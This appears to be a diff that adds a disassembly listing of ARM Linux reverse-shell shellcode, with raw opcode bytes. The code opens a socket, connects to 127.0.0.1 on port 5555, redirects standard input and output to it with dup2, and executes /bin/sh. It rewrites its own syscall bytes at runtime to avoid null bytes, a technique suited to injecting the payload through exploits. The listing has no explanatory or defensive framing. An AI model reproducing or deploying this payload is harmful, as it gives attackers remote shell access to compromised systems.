@@ -1,0 +1,101 @@
+.text:00010054                                                 _start
+.text:00010054 02 20 42 E0                                                     SUB             R2, R2, R2
+.text:00010058 00 10 8F E2                                                     ADR             R1, loc_10060
+.text:0001005C 4C 20 C1 E5                                                     STRB            R2, [R1,#(byte_100AC - 0x10060)]
+.text:00010060
+.text:00010060                                                 loc_10060                               ; DATA XREF: .text:00010058↑o
+.text:00010060 64 20 C1 E5                                                     STRB            R2, [R1,#(byte_100C4 - 0x10060)]
+.text:00010064 74 20 C1 E5                                                     STRB            R2, [R1,#(byte_100D4 - 0x10060)]
+.text:00010068 84 20 C1 E5                                                     STRB            R2, [R1,#(byte_100E4 - 0x10060)]
+.text:0001006C 94 20 C1 E5                                                     STRB            R2, [R1,#(byte_100F4 - 0x10060)]
+.text:00010070 B8 20 C1 E5                                                     STRB            R2, [R1,#(byte_10118 - 0x10060)]
+.text:00010074 C0 20 C1 E5                                                     STRB            R2, [R1,#(byte_10120 - 0x10060)]
+.text:00010078                                                 ; START OF FUNCTION CHUNK FOR setup
+.text:00010078
+.text:00010078                                                 modloop                                 ; CODE XREF: setup+C↓j
+.text:00010078 04 10 9F E5                                                     LDR             R1, =0xE1A01001
+.text:0001007C 01 00 00 EB                                                     BL              setup
+.text:0001007C                                                 ; END OF FUNCTION CHUNK FOR setup
+.text:0001007C                                                 ; ---------------------------------------------------------------------------
+.text:00010080 FF FF FF FF                                                     DCD 0xFFFFFFFF
+.text:00010084 01 10 A0 E1                                     dword_10084     DCD 0xE1A01001          ; DATA XREF: setup:modloop↑r
+.text:00010088
+.text:00010088                                                 ; =============== S U B R O U T I N E =======================================
+.text:00010088
+.text:00010088
+.text:00010088                                                 setup                                   ; CODE XREF: setup-C↑p
+.text:00010088
+.text:00010088                                                 ; FUNCTION CHUNK AT .text:00010078 SIZE 00000008 BYTES
+.text:00010088
+.text:00010088 0E 00 A0 E1                                                     MOV             R0, LR
+.text:0001008C 18 00 80 E2                                                     ADD             R0, R0, #0x18
+.text:00010090 02 00 20 E9                                                     STMDB           R0!, {R1}
+.text:00010094 F7 FF FF EA                                                     B               modloop
+.text:00010094                                                 ; End of function setup
+.text:00010094
+.text:00010098                                                 ; ---------------------------------------------------------------------------
+.text:00010098
+.text:00010098                                                 socket
+.text:00010098 02 00 A0 E3                                                     MOV             R0, #2
+.text:0001009C 01 10 A0 E3                                                     MOV             R1, #1
+.text:000100A0 06 20 A0 E3                                                     MOV             R2, #6
+.text:000100A4 11 7E A0 E3 09 70 87 E2                                         MOV             R7, #0x119
+.text:000100A4                                                 ; ---------------------------------------------------------------------------
+.text:000100AC 01                                              byte_100AC      DCB 1                   ; DATA XREF: .text:0001005C↑w
+.text:000100AD 00 00 EF                                                        DCB 0, 0, 0xEF
+.text:000100B0                                                 ; ---------------------------------------------------------------------------
+.text:000100B0
+.text:000100B0                                                 connect
+.text:000100B0 00 A0 A0 E1                                                     MOV             R10, R0
+.text:000100B4 68 10 8F E2                                                     ADR             R1, a
+.text:000100B8 10 20 A0 E3                                                     MOV             R2, #0x10
+.text:000100BC 11 7E A0 E3 0B 70 87 E2                                         MOV             R7, #0x11B
+.text:000100BC                                                 ; ---------------------------------------------------------------------------
+.text:000100C4 01                                              byte_100C4      DCB 1                   ; DATA XREF: .text:loc_10060↑w
+.text:000100C5 00 00 EF                                                        DCB 0, 0, 0xEF
+.text:000100C8                                                 ; ---------------------------------------------------------------------------
+.text:000100C8
+.text:000100C8                                                 dup2
+.text:000100C8 0A 00 A0 E1                                                     MOV             R0, R10
+.text:000100CC 01 10 21 E0                                                     EOR             R1, R1, R1
+.text:000100D0 3F 70 A0 E3                                                     MOV             R7, #0x3F ; '?'
+.text:000100D0                                                 ; ---------------------------------------------------------------------------
+.text:000100D4 01                                              byte_100D4      DCB 1                   ; DATA XREF: .text:00010064↑w
+.text:000100D5 00 00 EF                                                        DCB 0, 0, 0xEF
+.text:000100D8                                                 ; ---------------------------------------------------------------------------
+.text:000100D8 0A 00 A0 E1                                                     MOV             R0, R10
+.text:000100DC 01 10 A0 E3                                                     MOV             R1, #1
+.text:000100E0 3F 70 A0 E3                                                     MOV             R7, #0x3F ; '?'
+.text:000100E0                                                 ; ---------------------------------------------------------------------------
+.text:000100E4 01                                              byte_100E4      DCB 1                   ; DATA XREF: .text:00010068↑w
+.text:000100E5 00 00 EF                                                        DCB 0, 0, 0xEF
+.text:000100E8                                                 ; ---------------------------------------------------------------------------
+.text:000100E8 0A 00 A0 E1                                                     MOV             R0, R10
+.text:000100EC 02 10 A0 E3                                                     MOV             R1, #2
+.text:000100F0 3F 70 A0 E3                                                     MOV             R7, #0x3F ; '?'
+.text:000100F0                                                 ; ---------------------------------------------------------------------------
+.text:000100F4 01                                              byte_100F4      DCB 1                   ; DATA XREF: .text:0001006C↑w
+.text:000100F5 00 00 EF                                                        DCB 0, 0, 0xEF
+.text:000100F8                                                 ; ---------------------------------------------------------------------------
+.text:000100F8
+.text:000100F8                                                 execve
+.text:000100F8 2C 00 8F E2                                                     ADR             R0, aBinSh ; "/bin/sh"
+.text:000100FC 38 50 8F E2                                                     ADR             R5, 0x1013C
+.text:00010100 05 50 25 E0                                                     EOR             R5, R5, R5
+.text:00010104 20 00 2D E9                                                     PUSH            {R5}
+.text:00010108 01 00 2D E9                                                     PUSH            {R0}
+.text:0001010C 0D 10 A0 E1                                                     MOV             R1, SP
+.text:00010110 02 20 22 E0                                                     EOR             R2, R2, R2
+.text:00010114 0B 70 A0 E3                                                     MOV             R7, #0xB
+.text:00010114                                                 ; ---------------------------------------------------------------------------
+.text:00010118 01                                              byte_10118      DCB 1                   ; DATA XREF: .text:00010070↑w
+.text:00010119 00 00 EF                                                        DCB 0, 0, 0xEF
+.text:0001011C 01 70 A0 E3                                     exit            DCD 0xE3A07001
+.text:00010120 01                                              byte_10120      DCB 1                   ; DATA XREF: .text:00010074↑w
+.text:00010121 00 00 EF                                                        DCB 0, 0, 0xEF
+.text:00010124 02 00                                           a               DCB 2, 0                ; DATA XREF: .text:000100B4↑o
+.text:00010126 15 B3                                           b               DCW 0xB315
+.text:00010128 7F 00 00 01                                     c               DCD 0x100007F
+.text:0001012C 2F 62 69 6E 2F 73 68 00                         aBinSh          DCB "/bin/sh",0         ; DATA XREF: .text:execve↑o
+.text:0001012C                                                 ; .text         ends
+.text:0001012C
